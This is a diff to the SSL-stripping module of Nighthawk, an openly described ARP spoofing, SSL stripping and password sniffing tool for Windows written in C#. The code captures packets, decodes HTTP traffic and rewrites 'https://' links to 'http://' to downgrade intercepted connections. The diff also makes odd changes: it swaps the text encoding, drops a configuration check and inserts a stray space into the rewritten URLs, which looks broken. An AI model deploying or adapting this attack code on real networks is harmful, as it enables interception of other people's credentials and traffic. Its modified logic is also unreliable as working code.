@@ -10,6 +10,23 @@ using System.Threading;
 using PacketDotNet;
 using SharpPcap;
 
+/**
+Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
+Copyright (C) 2010  Klemen Bratec
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+**/
 namespace Nighthawk
 {
     public class SSLStrip
@@ -34,8 +51,7 @@ namespace Nighthawk
         private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
 
         // encoding converter
-        private static Encoding encodingAscii = Encoding.GetEncoding(1251);
-        private static UTF8Encoding encodingUtf8 = new UTF8Encoding();
+        private static ASCIIEncoding encodingUtf8 = new ASCIIEncoding();
 
         // constructor
         public SSLStrip(LivePcapDevice device)
@@ -47,19 +63,16 @@ namespace Nighthawk
         // start SSL strip
         public void Start(bool excludeLocalIP, DeviceInfo deviceInfo, ARPTools arpTools)
         {
-            // set
             this.excludeLocalIP = excludeLocalIP;
             this.deviceInfo = deviceInfo;
             this.arpTools = arpTools;
 
-            // change status
             Started = true;
         }
 
         // stop SSL strip
         public void Stop()
         {
-            // change status
             Started = false;
         }
 
@@ -69,14 +82,16 @@ namespace Nighthawk
             var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress.ToString();
             var destIP = (packet.ParentPacket as IpPacket).DestinationAddress.ToString();
 
+            var payload = packet.PayloadData;
+
             // exclusion of local IP
-            if (excludeLocalIP && (sourceIP == deviceInfo.IP || destIP == deviceInfo.IP)) return;
+            if ((sourceIP == deviceInfo.IP || destIP == deviceInfo.IP)) return;
 
             // check payload
             if (packet.PayloadData == null) return;
-            
+
             // decode content
-            var data = encodingUtf8.GetString(packet.PayloadData);
+            var data = encodingUtf8.GetString(payload);
             
             if (data != string.Empty)
             {
@@ -124,16 +139,16 @@ namespace Nighthawk
 
                     // check for images
                     if (cmatches.Count > 1 && cmatches[1].Contains("image")) return;
-
+                    
                     if (data.IndexOf("\"https://") != -1)
                     {
-                        data = data.Replace("\"https://", "\"http://");
+                        data = data.Replace("\"https://", "\" http://");
                         changed = true;
                     }
 
                     if (data.IndexOf("'https://") != -1)
                     {
-                        data = data.Replace("'https://", "'http://");
+                        data = data.Replace("'https://", "' http://");
                         changed = true;
                     }
                 }
@@ -142,7 +157,7 @@ namespace Nighthawk
                 {
                     // re-pack data
                     var bytes = encodingUtf8.GetBytes(data);
-
+                    
                     var diff = packet.PayloadData.Length - bytes.Length;
 
                     packet.PayloadData = bytes;
